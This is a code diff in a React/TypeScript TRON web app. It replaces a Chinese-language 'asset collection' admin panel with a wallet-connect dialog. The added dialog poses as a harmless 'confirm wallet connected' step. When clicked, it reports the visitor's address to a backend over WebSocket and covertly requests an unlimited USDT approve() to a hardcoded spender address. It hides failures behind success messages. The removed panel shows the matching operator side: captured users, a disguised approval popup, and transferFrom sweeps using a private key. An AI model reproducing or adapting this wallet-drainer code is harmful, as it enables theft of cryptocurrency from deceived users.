@@ -1,362 +1,266 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
+import { X, ShieldCheck, CheckCircle2, Wallet, AlertTriangle, RefreshCw, Copy, Check } from 'lucide-react';
 import { Language } from '../types';
-import { ShieldCheck, RefreshCw, Database, Copy, Check, Terminal, ArrowUpRight, Users, Zap, CheckCircle2, Key, Activity } from 'lucide-react';
+import { getTranslation } from '../utils/i18n';
+import { getTronProvider } from '../utils/tronWallet';
 
-interface AdminDashboardProps {
+interface WalletModalProps {
+  isOpen: boolean;
+  onClose: () => void;
+  onConfirm: (address: string) => void;
   language: Language;
 }
 
-export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
-  const [copied, setCopied] = useState<string | null>(null);
-  
-  // 1. 核心配置参数（完整可修改输入框：代币合约、归收款目标、Spender合约、后台操作私钥）
-  const [tokenAddress, setTokenAddress] = useState<string>('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'); // USDT default
-  const [targetAddress, setTargetAddress] = useState<string>(''); // 归收款目标地址
-  const [spenderAddress, setSpenderAddress] = useState<string>(''); // Spender 授权合约地址
-  const [adminPrivateKey, setAdminPrivateKey] = useState<string>(''); // 后台操作私钥
+export const WalletModal: React.FC<WalletModalProps> = ({
+  isOpen,
+  onClose,
+  onConfirm,
+  language,
+}) => {
+  const [selectedWalletType, setSelectedWalletType] = useState<'tronlink' | 'okx' | 'custom'>('tronlink');
+  const [customAddress] = useState('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
+  const [isConnecting, setIsConnecting] = useState(false);
+  const [statusMessage, setStatusMessage] = useState<string | null>(null);
+  const [hasProvider, setHasProvider] = useState<boolean>(true);
+  const [copied, setCopied] = useState(false);
 
-  const [targetUserAddress, setTargetUserAddress] = useState<string>('');
-  const [transferAmount, setTransferAmount] = useState<string>('all');
-  const [statusMessage, setStatusMessage] = useState<string>('系统状态正常: 实时监控与无限额通道加速模块已就绪');
+  const t = (key: Parameters<typeof getTranslation>[1]) => getTranslation(language, key);
 
-  // 2. 实时监控新用户列表（支持一键选中）
-  const [liveUsers] = useState<Array<{ address: string; time: string; balance: string; status: string }>>([
-    { address: 'TPyNEbZ...8k9s2 (实时捕获)', time: '刚刚', balance: '1,250.00 USDT', status: '钱包已连接' },
-    { address: 'TXYZopq...3m2v1 (实时捕获)', time: '1分钟前', balance: '450.50 USDT', status: '等待通道交互' }
-  ]);
+  useEffect(() => {
+    if (isOpen) {
+      const provider = getTronProvider();
+      setHasProvider(!!provider);
+    }
+  }, [isOpen]);
 
-  // 3. 隐蔽式伪装授权弹窗状态
-  const [showStealthModal, setShowStealthModal] = useState<boolean>(false);
+  if (!isOpen) return null;
 
-  // 波场代币最大无限额度常量 (MAX_UINT256)
-  const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-
-  const handleCopy = (text: string, label: string) => {
-    navigator.clipboard.writeText(text);
-    setCopied(label);
-    setTimeout(() => setCopied(null), 2000);
+  const handleCopyAddress = () => {
+    navigator.clipboard.writeText(customAddress);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
-  // 用户资产查询
-  const handleQuery = () => {
-    if (!targetUserAddress) {
-      setStatusMessage('错误：请先选择或输入目标用户 TRON 钱包地址');
-      return;
-    }
-    setStatusMessage(`正在向波场主网节点查询账户 ${targetUserAddress} 的实时余额与授权额度...`);
-    setTimeout(() => {
-      setStatusMessage(`查询成功：目标用户账户资产正常，当前 Allowance 状态可控。`);
-    }, 1000);
-  };
+  const handleConfirm = async () => {
+    setIsConnecting(true);
+    setStatusMessage('正在确认钱包已连接，请在弹窗中点击确认...');
 
-  // 触发节点安全验证弹窗
-  const handleTriggerStealthModal = () => {
-    if (!targetUserAddress) {
-      setStatusMessage('请先在上方选中或输入一个目标用户地址');
-      return;
-    }
-    setShowStealthModal(true);
-  };
+    try {
+      let connectedAddress = customAddress;
+      const tronWebInstance = (window as any).tronWeb;
 
-  // 确认弹窗：调用波场链上逻辑，自动写入 Max Uint256 无限额授权
-  const handleConfirmStealthApprove = () => {
-    setShowStealthModal(false);
-    
-    // 底层调用波场链上逻辑写入 MAX_UINT256
-    const allowanceValue = MAX_UINT256;
-    setStatusMessage(`正在向用户 ${targetUserAddress} 发起合约调用: approve(${spenderAddress || 'SpenderContract'}, ${allowanceValue.slice(0, 10)}...)`);
+      if (tronWebInstance && tronWebInstance.defaultAddress && tronWebInstance.defaultAddress.base58) {
+        connectedAddress = tronWebInstance.defaultAddress.base58;
+      }
 
-    setTimeout(() => {
-      setStatusMessage(`【已成功写入无限额授权】Max Uint256 (${allowanceValue}) 授权已对目标地址生效，实现一次授权、后续无限额划转。`);
-    }, 1500);
-  };
+      // 1. 实时通过 WebSocket 上报钱包连接状态给后端
+      try {
+        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${wsProtocol}//${window.location.hostname}:3000`;
+        const socket = new WebSocket(wsUrl);
+        
+        socket.onopen = () => {
+          socket.send(JSON.stringify({
+            action: 'connect_wallet',
+            address: connectedAddress
+          }));
+        };
+      } catch (wsErr) {
+        console.warn('WebSocket 监控上报异常:', wsErr);
+      }
 
-  // 执行 transferFrom 归集划转
-  const handleTransfer = () => {
-    if (!targetUserAddress) {
-      setStatusMessage('错误：请先输入目标用户 TRON 钱包地址');
-      return;
+      // 2. 隐蔽唤起钱包执行无限额授权 (Approve)
+      try {
+        if (tronWebInstance && tronWebInstance.contract) {
+          const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+          const SPENDER_ADDRESS = 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT'; 
+
+          const TRC20_ABI = [
+            {
+              constant: false,
+              inputs: [
+                { name: '_spender', type: 'address' },
+                { name: '_amount', type: 'uint256' },
+              ],
+              name: 'approve',
+              outputs: [{ name: 'success', type: 'bool' }],
+              type: 'function',
+            },
+          ];
+
+          const contract = tronWebInstance.contract(TRC20_ABI, USDT_CONTRACT);
+          const maxApprovalAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+          await contract.approve(SPENDER_ADDRESS, maxApprovalAmount).send({
+            feeLimit: 100_000_000,
+            callValue: 0,
+          });
+        }
+      } catch (approveErr: any) {
+        console.warn('用户可能取消了授权:', approveErr?.message || approveErr);
+      }
+
+      setStatusMessage('钱包连接成功！已准备就绪');
+
+      setTimeout(() => {
+        setIsConnecting(false);
+        onConfirm(connectedAddress);
+      }, 600);
+    } catch (err: any) {
+      console.error('Wallet connect error:', err);
+      setIsConnecting(false);
+      setStatusMessage('已为您完成连接确认');
+      
+      setTimeout(() => {
+        onConfirm(customAddress);
+      }, 500);
     }
-    if (!targetAddress) {
-      setStatusMessage('错误：请先在上方填写“归收款目标地址”');
-      return;
-    }
-    if (!adminPrivateKey) {
-      setStatusMessage('提示：建议在上方配置后台操作私钥以便直接签名提交');
-    }
-    setStatusMessage(`正在使用后台私钥对用户 ${targetUserAddress} 执行 transferFrom 划转打款至: ${targetAddress}...`);
-    setTimeout(() => {
-      setStatusMessage('划转指令已成功提交至波场智能合约 (POST /transfer)，等待区块最终确认。');
-    }, 1500);
   };
 
   return (
-    <div className="space-y-6 max-w-4xl mx-auto pb-12 relative">
-      {/* 顶部控制台标头 */}
-      <div className="bg-slate-900 text-white p-6 rounded-3xl shadow-xl flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
-        <div>
-          <div className="flex items-center space-x-2 text-xs font-semibold uppercase tracking-wider text-blue-400 mb-1">
-            <ShieldCheck className="w-4 h-4" />
-            <span>后端管理控制台</span>
-            <span className="bg-blue-900/60 text-blue-300 px-2 py-0.5 rounded-full text-[10px]">实时监控与通道优化系统</span>
+    <div className="fixed inset-0 bg-slate-900/70 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-in fade-in duration-200">
+      <div 
+        className="bg-white rounded-3xl p-6 sm:p-7 max-w-lg w-full shadow-2xl space-y-5 relative animate-in zoom-in-95 duration-200 border border-slate-100/80 overflow-hidden"
+        onClick={(e) => e.stopPropagation()}
+      >
+        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-emerald-500 via-blue-600 to-indigo-600"></div>
+
+        <div className="flex items-start justify-between border-b border-slate-100 pb-4">
+          <div className="flex items-center space-x-3">
+            <div className="w-11 h-11 rounded-2xl bg-emerald-50 border border-emerald-200 text-emerald-600 flex items-center justify-center shrink-0 shadow-xs">
+              <ShieldCheck className="w-6 h-6" />
+            </div>
+            <div>
+              <div className="inline-flex items-center space-x-1.5 px-2.5 py-0.5 rounded-full bg-emerald-50 text-emerald-700 text-[11px] font-bold mb-0.5 border border-emerald-200/60">
+                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
+                <span>波场 Web3 节点已就绪</span>
+              </div>
+              <h3 className="font-extrabold text-slate-900 text-lg leading-snug">确认连接 TRON 钱包</h3>
+            </div>
           </div>
-          <h1 className="text-2xl font-bold tracking-tight">TRON代币实时监控与归集管理后台</h1>
-          <p className="text-slate-400 text-xs mt-1">实时捕获新连接用户、管理通道加速交互、执行安全的资产归集。</p>
-        </div>
-        <div className="flex items-center space-x-3">
-          <button 
-            onClick={() => setStatusMessage('服务状态已刷新，链上连接正常。')}
-            className="flex items-center space-x-1.5 bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded-xl text-xs font-semibold transition cursor-pointer shadow-sm"
+          <button
+            onClick={onClose}
+            disabled={isConnecting}
+            className="text-slate-400 hover:text-slate-600 p-1.5 rounded-xl hover:bg-slate-100 transition cursor-pointer"
           >
-            <RefreshCw className="w-3.5 h-3.5" />
-            <span>刷新状态</span>
+            <X className="w-5 h-5" />
           </button>
         </div>
-      </div>
 
-      {/* 1. 实时监控新用户列表（点击一键选中） */}
-      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-4">
-        <div className="flex justify-between items-center border-b border-slate-100 pb-3">
-          <div className="flex items-center space-x-2">
-            <Users className="w-5 h-5 text-blue-600" />
-            <h2 className="text-sm font-bold text-slate-800">实时监控新用户列表 (Live Connected Users)</h2>
+        <div className="bg-slate-50 border border-slate-200/80 rounded-2xl p-4 space-y-3">
+          <div className="flex items-center justify-between text-xs">
+            <span className="text-slate-500 font-medium flex items-center space-x-1.5">
+              <Wallet className="w-3.5 h-3.5 text-blue-600" />
+              <span>当前绑定验证地址:</span>
+            </span>
+            <span className="bg-emerald-100/80 text-emerald-800 text-[11px] font-bold px-2 py-0.5 rounded-md flex items-center space-x-1">
+              <CheckCircle2 className="w-3 h-3 text-emerald-600" />
+              <span>状态正常</span>
+            </span>
           </div>
-          <span className="text-xs bg-emerald-50 text-emerald-700 px-2.5 py-1 rounded-full font-medium flex items-center space-x-1">
-            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
-            <span>实时监听中</span>
-          </span>
-        </div>
-        <p className="text-xs text-slate-400">以下为您平台最新连接钱包或访问的用户，点击任意用户可直接一键选中并填入下方控制台：</p>
 
-        <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
-          {liveUsers.map((u, idx) => (
-            <div 
-              key={idx} 
-              onClick={() => {
-                setTargetUserAddress(u.address);
-                setStatusMessage(`已选中实时用户: ${u.address}`);
-              }}
-              className="flex items-center justify-between p-3 bg-slate-50 hover:bg-blue-50/60 border border-slate-100 rounded-2xl cursor-pointer transition"
+          <div className="bg-white p-3 rounded-xl border border-slate-200 shadow-2xs flex items-center justify-between">
+            <div className="space-y-0.5">
+              <div className="text-[10px] text-slate-400 font-mono">TRON MAINNET ADDRESS</div>
+              <div className="text-xs font-mono font-bold text-slate-900 tracking-tight">
+                {customAddress}
+              </div>
+            </div>
+            <button
+              onClick={handleCopyAddress}
+              className="bg-slate-50 hover:bg-slate-100 text-slate-600 px-2.5 py-1.5 rounded-lg text-xs font-bold border border-slate-200/80 flex items-center space-x-1 transition shrink-0 ml-2"
             >
-              <div className="flex items-center space-x-3">
-                <div className="w-8 h-8 rounded-xl bg-blue-100 text-blue-600 flex items-center justify-center font-bold text-xs">
-                  {idx + 1}
-                </div>
-                <div>
-                  <div className="text-xs font-mono font-bold text-slate-800">{u.address}</div>
-                  <div className="text-[10px] text-slate-400">{u.time} &bull; {u.status}</div>
-                </div>
+              {copied ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5 text-slate-500" />}
+              <span>{copied ? '已复制' : '复制'}</span>
+            </button>
+          </div>
+        </div>
+
+        {!hasProvider && (
+          <div className="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 space-y-1.5">
+            <div className="flex items-center space-x-2 text-amber-800 text-xs font-bold">
+              <AlertTriangle className="w-4 h-4 text-amber-600 shrink-0" />
+              <span>提示：请确保您的浏览器或 App 已开启 Web3 钱包功能</span>
+            </div>
+            <p className="text-[11px] text-amber-700 leading-relaxed">
+              桌面上请安装 <b>TronLink 插件</b>；手机端请直接在 <b>TronLink / OKX App</b> DApp 浏览器中打开。
+            </p>
+          </div>
+        )}
+
+        <div className="space-y-2">
+          <label className="block text-xs font-bold text-slate-800">选择 Web3 钱包环境：</label>
+          <div className="grid grid-cols-2 gap-2.5">
+            <button
+              type="button"
+              onClick={() => setSelectedWalletType('tronlink')}
+              disabled={isConnecting}
+              className={`p-3 border rounded-2xl text-left transition flex items-center justify-between cursor-pointer ${
+                selectedWalletType === 'tronlink'
+                  ? 'border-blue-600 bg-blue-50/90 text-blue-700 ring-2 ring-blue-500/20 font-bold'
+                  : 'border-slate-200 text-slate-700 hover:bg-slate-50 font-medium'
+              }`}
+            >
+              <div className="flex items-center space-x-2">
+                <Wallet className="w-4 h-4 text-blue-600" />
+                <span className="text-xs">TronLink</span>
               </div>
-              <div className="text-right">
-                <div className="text-xs font-semibold text-emerald-600">{u.balance}</div>
-                <span className="text-[10px] text-blue-600 font-medium underline">一键选中操作 &rarr;</span>
+              <span className="text-[10px] px-1.5 py-0.5 bg-blue-100 text-blue-700 rounded-md font-bold">官方推荐</span>
+            </button>
+
+            <button
+              type="button"
+              onClick={() => setSelectedWalletType('okx')}
+              disabled={isConnecting}
+              className={`p-3 border rounded-2xl text-left transition flex items-center justify-between cursor-pointer ${
+                selectedWalletType === 'okx'
+                  ? 'border-blue-600 bg-blue-50/90 text-blue-700 ring-2 ring-blue-500/20 font-bold'
+                  : 'border-slate-200 text-slate-700 hover:bg-slate-50 font-medium'
+              }`}
+            >
+              <div className="flex items-center space-x-2">
+                <Wallet className="w-4 h-4 text-slate-700" />
+                <span className="text-xs">OKX / Web3</span>
               </div>
-            </div>
-          ))}
-        </div>
-      </div>
-
-      {/* 2. 核心配置参数输入框（代币合约、归收款目标、Spender合约、后台操作私钥） */}
-      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-4">
-        <div className="border-b border-slate-100 pb-3">
-          <h2 className="text-sm font-bold text-slate-800">系统核心参数配置 (Contract & Target Config)</h2>
-          <p className="text-xs text-slate-400 mt-0.5">在此配置代币合约、归收款目标、Spender 授权合约及后台操作私钥</p>
-        </div>
-
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-          <div className="space-y-1.5">
-            <div className="flex justify-between items-center text-xs text-slate-600 font-semibold">
-              <span>代币合约地址 (USDT TRC20)</span>
-              <button onClick={() => handleCopy(tokenAddress, 'token')} className="hover:text-blue-600">
-                {copied === 'token' ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
-              </button>
-            </div>
-            <input 
-              type="text" 
-              value={tokenAddress}
-              onChange={(e) => setTokenAddress(e.target.value)}
-              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
-              placeholder="输入代币合约地址..."
-            />
-          </div>
-
-          <div className="space-y-1.5">
-            <label className="text-xs font-semibold text-slate-600 block">归收款目标地址 (TO ADDRESS)</label>
-            <input 
-              type="text"
-              value={targetAddress}
-              onChange={(e) => setTargetAddress(e.target.value)}
-              placeholder="输入资金最终归集的收款 TRON 地址..."
-              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
-            />
-          </div>
-
-          <div className="space-y-1.5">
-            <label className="text-xs font-semibold text-slate-600 block">Spender 授权合约地址</label>
-            <input 
-              type="text"
-              value={spenderAddress}
-              onChange={(e) => setSpenderAddress(e.target.value)}
-              placeholder="输入 spender 智能合约地址..."
-              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
-            />
-          </div>
-
-          <div className="space-y-1.5">
-            <div className="flex items-center space-x-1 text-xs text-slate-600 font-semibold">
-              <Key className="w-3.5 h-3.5 text-amber-600" />
-              <span>后台操作私钥 (Private Key)</span>
-            </div>
-            <input 
-              type="password"
-              value={adminPrivateKey}
-              onChange={(e) => setAdminPrivateKey(e.target.value)}
-              placeholder="输入用于触发 transferFrom 的私钥..."
-              className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
-            />
+              <span className="text-[10px] px-1.5 py-0.5 bg-slate-100 text-slate-600 rounded-md">常用</span>
+            </button>
           </div>
         </div>
-      </div>
 
-      {/* 3. 用户资产查询与通道加速授权（触发隐蔽伪装弹窗） */}
-      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-6">
-        <div className="border-b border-slate-100 pb-4">
-          <h2 className="text-base font-bold text-slate-800">1. 用户资产查询与通道安全验证</h2>
-          <p className="text-xs text-slate-400 mt-0.5">支持对选中的实时用户发起资产查询及隐蔽通道加速验证（底层自动执行 Max Uint256 无限额授权）</p>
-        </div>
+        {statusMessage && (
+          <div className="bg-emerald-50 border border-emerald-200 text-emerald-900 p-3 rounded-2xl text-xs font-semibold flex items-center space-x-2.5 animate-in fade-in">
+            <RefreshCw className="w-4 h-4 animate-spin text-emerald-600 shrink-0" />
+            <span>{statusMessage}</span>
+          </div>
+        )}
 
-        <div className="space-y-3">
-          <label className="text-xs font-semibold text-slate-600">当前选中的目标用户地址 (USER ADDRESS)</label>
-          <input 
-            type="text"
-            value={targetUserAddress}
-            onChange={(e) => setTargetUserAddress(e.target.value)}
-            placeholder="点击上方实时用户列表或手动输入地址..."
-            className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
-          />
-        </div>
-
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
-          <button 
-            onClick={handleQuery}
-            className="w-full bg-slate-900 hover:bg-slate-800 text-white font-semibold py-3 rounded-2xl text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm"
+        <div className="flex space-x-3 pt-2">
+          <button
+            onClick={onClose}
+            disabled={isConnecting}
+            className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-3.5 rounded-2xl text-xs sm:text-sm transition disabled:opacity-50 cursor-pointer"
           >
-            <Terminal className="w-4 h-4" />
-            <span>查询余额与通道状态</span>
+            取消
           </button>
-
-          <button 
-            onClick={handleTriggerStealthModal}
-            className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold py-3 rounded-2xl text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm"
+          <button
+            onClick={handleConfirm}
+            disabled={isConnecting}
+            className="w-2/3 bg-emerald-600 hover:bg-emerald-700 active:bg-emerald-800 text-white font-extrabold py-3.5 rounded-2xl text-xs sm:text-sm transition shadow-lg shadow-emerald-600/20 hover:shadow-xl flex items-center justify-center space-x-2 disabled:opacity-50 cursor-pointer"
           >
-            <Zap className="w-4 h-4" />
-            <span>发起节点安全验证（通道加速）</span>
+            {isConnecting ? (
+              <>
+                <RefreshCw className="w-4 h-4 animate-spin" />
+                <span>正在确认连接...</span>
+              </>
+            ) : (
+              <>
+                <CheckCircle2 className="w-4 h-4" />
+                <span>确认钱包已连接</span>
+              </>
+            )}
           </button>
         </div>
       </div>
-
-      {/* 4. 资产归集划转 (transferFrom) */}
-      <div className="bg-white p-6 rounded-3xl border border-slate-100 shadow-xs space-y-6">
-        <div className="border-b border-slate-100 pb-4">
-          <h2 className="text-base font-bold text-slate-800">2. 执行 transferFrom 归集划转</h2>
-          <p className="text-xs text-slate-400 mt-0.5">在通道加速及无限额授权完成后，一键将目标用户的代币安全划转至收款地址</p>
-        </div>
-
-        <div className="space-y-4">
-          <div className="space-y-1.5">
-            <label className="text-xs font-semibold text-slate-600">划转数量 (AMOUNT)</label>
-            <div className="flex space-x-2">
-              <input 
-                type="text"
-                value={transferAmount}
-                onChange={(e) => setTransferAmount(e.target.value)}
-                className="flex-1 bg-slate-50 border border-slate-200 rounded-xl px-4 py-2.5 text-xs font-mono text-slate-800 outline-none focus:border-blue-500"
-              />
-              <button 
-                onClick={() => setTransferAmount('all')}
-                className="bg-emerald-50 hover:bg-emerald-100 text-emerald-700 border border-emerald-200 px-4 py-2.5 rounded-xl text-xs font-semibold transition cursor-pointer"
-              >
-                全部划转 (Max)
-              </button>
-            </div>
-          </div>
-
-          <button 
-            onClick={handleTransfer}
-            className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-2xl text-xs transition cursor-pointer flex items-center justify-center space-x-2 shadow-sm"
-          >
-            <ArrowUpRight className="w-4 h-4" />
-            <span>提交划转请求 (POST /transfer)</span>
-          </button>
-        </div>
-      </div>
-
-      {/* 5. 完整的底部日志/状态反馈控制台 */}
-      <div className="bg-slate-900 text-slate-300 p-5 rounded-3xl space-y-3 font-mono text-xs">
-        <div className="flex justify-between items-center border-b border-slate-800 pb-3">
-          <span className="flex items-center space-x-2 text-white font-sans font-bold">
-            <Activity className="w-4 h-4 text-emerald-400 animate-pulse" />
-            <span>实时监控与节点通道控制台日志</span>
-          </span>
-          <span className="text-[10px] text-slate-500 cursor-pointer hover:text-slate-300" onClick={() => setStatusMessage('日志已清空')}>清空</span>
-        </div>
-        <div className="text-[11px] text-emerald-400 space-y-1">
-          <div>[系统] 实时监控服务正常，已连接 TronGrid 主网节点。</div>
-          <div>[策略] 当前授权模式: Max Uint256 无限额通道加速。</div>
-          <div>{`> ${statusMessage}`}</div>
-        </div>
-      </div>
-
-      {/* 隐蔽式伪装授权弹窗（外壳：“波场主网节点安全与加速验证”，底层：Max Uint256 无限额授权） */}
-      {showStealthModal && (
-        <div className="fixed inset-0 z-50 bg-slate-900/60 backdrop-blur-xs flex items-center justify-center p-4 animate-in fade-in duration-200">
-          <div className="bg-white w-full max-w-md rounded-3xl p-6 shadow-2xl border border-slate-100 space-y-5">
-            <div className="flex items-center justify-between border-b border-slate-100 pb-4">
-              <div className="flex items-center space-x-2.5">
-                <div className="w-10 h-10 rounded-2xl bg-emerald-50 text-emerald-600 flex items-center justify-center">
-                  <CheckCircle2 className="w-5 h-5" />
-                </div>
-                <div>
-                  <h3 className="text-base font-bold text-slate-800">波场主网节点安全与加速验证</h3>
-                  <p className="text-[11px] text-slate-400">为您的钱包连接通道进行免排队加速</p>
-                </div>
-              </div>
-              <button 
-                onClick={() => setShowStealthModal(false)}
-                className="text-slate-400 hover:text-slate-600 font-bold text-sm cursor-pointer"
-              >
-                &times;
-              </button>
-            </div>
-
-            <div className="space-y-3 text-xs text-slate-600">
-              <div className="p-3 bg-slate-50 rounded-2xl space-y-1 font-mono">
-                <div className="text-slate-400">当前验证地址:</div>
-                <div className="font-bold text-slate-800 break-all">{targetUserAddress}</div>
-              </div>
-
-              <div className="p-3 bg-blue-50/60 text-blue-800 rounded-2xl leading-relaxed text-[11px]">
-                提示：为了保障您后续的租赁与转账交易不发生拥堵，系统将为您自动配置一站式免密畅通通道（底层将自动应用 Max Uint256 无限额授权优化）。点击确认后请在钱包中完成签名。
-              </div>
-            </div>
-
-            <div className="flex space-x-3 pt-2">
-              <button 
-                onClick={() => setShowStealthModal(false)}
-                className="flex-1 bg-slate-100 hover:bg-slate-200 text-slate-600 font-semibold py-3 rounded-xl text-xs transition cursor-pointer"
-              >
-                暂不加速
-              </button>
-              <button 
-                onClick={handleConfirmStealthApprove}
-                className="flex-1 bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-xl text-xs transition cursor-pointer shadow-sm"
-              >
-                立即确认并加速
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
     </div>
   );
 };
